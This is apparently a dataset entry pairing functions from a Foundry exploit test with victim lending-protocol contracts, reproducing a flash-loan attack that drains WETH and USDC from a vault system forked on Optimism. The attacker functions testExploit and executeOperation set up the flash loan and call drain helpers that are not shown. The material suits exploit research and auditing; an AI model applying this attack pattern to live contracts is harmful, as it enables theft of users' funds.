[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "executeOperation",
    "original_code": "    function executeOperation(\n        address[] calldata assets,\n        uint256[] calldata amounts,\n        uint256[] calldata premiums,\n        address initiator,\n        bytes calldata params\n    ) external returns (bool) {\n        WETH.approve(address(aaveV3), type(uint256).max);\n        USDC.approve(address(aaveV3), type(uint256).max);\n\n        WETHDrain(assets[0], amounts[0]);\n        USDCDrain(assets[1], amounts[1]);\n\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"optimism\", 106_676_494);\n        vm.label(address(USDC), \"USDC\");\n        vm.label(address(WETH), \"WETH\");\n        vm.label(address(aaveV3), \"aaveV3\");\n        vm.label(address(Factory), \"Factory\");\n        vm.label(address(darcWETH), \"darcWETH\");\n        vm.label(address(ActionMultiCall), \"ActionMultiCall\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() external {\n        address[] memory assets = new address[](2);\n        assets[0] = address(WETH);\n        assets[1] = address(USDC);\n        uint256[] memory amounts = new uint256[](2);\n        amounts[0] = 29_847_813_623_947_075_968;\n        amounts[1] = 11_916_676_700;\n        uint256[] memory modes = new uint256[](2);\n        modes[0] = 0;\n        modes[1] = 0;\n        aaveV3.flashLoan(address(this), assets, amounts, modes, address(this), \"\", 0);\n\n        emit log_named_decimal_uint(\n            \"Attacker USDC balance after exploit\", USDC.balanceOf(address(this)), USDC.decimals()\n        );\n\n        emit log_named_decimal_uint(\n            \"Attacker WETH balance after exploit\", WETH.balanceOf(address(this)), WETH.decimals()\n        );\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IVault",
    "source_type": "victim_contract",
    "function_name": "deposit",
    "original_code": "    function deposit() public payable {\n        balanceOf[msg.sender] += msg.value;\n        emit Deposit(msg.sender, msg.value);\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "IVault",
    "source_type": "victim_contract",
    "function_name": "openTrustedMarginAccount",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IVault",
    "source_type": "victim_contract",
    "function_name": "vaultManagementAction",
    "original_code": "    function vaultManagementAction(address actionHandler, bytes calldata actionData)\n        external\n        returns (address, uint256);\n}\n",
    "description": ""
  },
  {
    "contract/interface": "Helper2",
    "source_type": "victim_contract",
    "function_name": "rekt",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "LendingPool",
    "source_type": "victim_contract",
    "function_name": "doActionWithLeverage",
    "original_code": "    function doActionWithLeverage(\n        uint256 amountBorrowed,\n        address vault,\n        address actionHandler,\n        bytes calldata actionData,\n        bytes3 referrer\n    ) external whenBorrowNotPaused processInterests {\n        //If vault is not an actual address of a vault, ownerOfVault(address) will return the zero address.\n        address vaultOwner = IFactory(vaultFactory).ownerOfVault(vault);\n        require(vaultOwner != address(0), \"LP_DAWL: Not a vault\");\n\n        uint256 amountBorrowedWithFee = amountBorrowed + (amountBorrowed * originationFee) / 10_000;\n\n        //Check allowances to take debt.\n        if (vaultOwner != msg.sender) {\n            //Since calling vaultManagementAction() gives the sender full control over all assets in the vault,\n            //Only Beneficiaries with maximum allowance can call the doActionWithLeverage function.\n            require(creditAllowance[vault][vaultOwner][msg.sender] == type(uint256).max, \"LP_DAWL: UNAUTHORIZED\");\n        }\n\n        //Mint debt tokens to the vault, debt must be minted Before the actions in the vault are performed.\n        _deposit(amountBorrowedWithFee, vault);\n\n        //Add origination fee to the treasury.\n        unchecked {\n            totalRealisedLiquidity += SafeCastLib.safeCastTo128(amountBorrowedWithFee - amountBorrowed);\n            realisedLiquidityOf[treasury] += amountBorrowedWithFee - amountBorrowed;\n        }\n\n        //Send Borrowed funds to the actionHandler.\n        asset.safeTransfer(actionHandler, amountBorrowed);\n\n        //The actionHandler will use the borrowed funds (optionally with additional assets withdrawn from the Vault)\n        //to execute one or more actions (swap, deposit, mint...).\n        //Next the actionHandler will deposit any of the remaining funds or any of the recipient token\n        //resulting from the actions back into the vault.\n        //As last step, after all assets are deposited back into the vault a final health check is done:\n",
    "description": ""
  },
  {
    "contract/interface": "LendingPool",
    "source_type": "victim_contract",
    "function_name": "liquidateVault",
    "original_code": "    function liquidateVault(address vault) external whenLiquidationNotPaused processInterests {\n        //Only Vaults can have debt, and debtTokens are non-transferrable.\n        //Hence by checking that the balance of the address passed as vault is not 0, we know the address\n        //passed as vault is indeed a vault and has debt.\n        uint256 openDebt = maxWithdraw(vault);\n        require(openDebt != 0, \"LP_LV: Not a Vault with debt\");\n\n        //Store liquidation initiator to pay out initiator reward when auction is finished.\n        liquidationInitiator[vault] = msg.sender;\n\n        //Start the auction of the collateralised assets to repay debt.\n        ILiquidator(liquidator).startAuction(vault, openDebt, maxInitiatorFee);\n\n        //Hook to the most junior Tranche, to inform that auctions are ongoing,\n        //already done if there are other auctions in progress (auctionsInProgress > O).\n        if (auctionsInProgress == 0) {\n            ITranche(tranches[tranches.length - 1]).setAuctionInProgress(true);\n        }\n        unchecked {\n            ++auctionsInProgress;\n        }\n\n        //Remove debt from Vault (burn DebtTokens).\n        _withdraw(openDebt, vault, vault);\n\n        //Event emitted by Liquidator.\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IFactory",
    "source_type": "victim_contract",
    "function_name": "createVault",
    "original_code": "    function createVault(uint256 salt, uint16 vaultVersion, address baseCurrency)\n        external\n        whenCreateNotPaused\n        returns (address vault)\n    {\n        vaultVersion = vaultVersion == 0 ? latestVaultVersion : vaultVersion;\n\n        require(vaultVersion <= latestVaultVersion, \"FTRY_CV: Unknown vault version\");\n        require(!vaultVersionBlocked[vaultVersion], \"FTRY_CV: Vault version blocked\");\n\n        // Hash tx.origin with the user provided salt to avoid front-running vault deployment with an identical salt.\n        // We use tx.origin instead of msg.sender so that deployments through a third party contract is not vulnerable to front-running.\n        vault = address(new Proxy{salt: keccak256(abi.encodePacked(salt, tx.origin))}(vaultDetails[vaultVersion].logic));\n\n        IVault(vault).initialize(msg.sender, vaultDetails[vaultVersion].registry, uint16(vaultVersion), baseCurrency);\n\n        allVaults.push(vault);\n        vaultIndex[vault] = allVaults.length;\n\n        _mint(msg.sender, allVaults.length);\n\n        emit VaultUpgraded(vault, 0, vaultVersion);\n    }\n\n",
    "description": ""
  }
]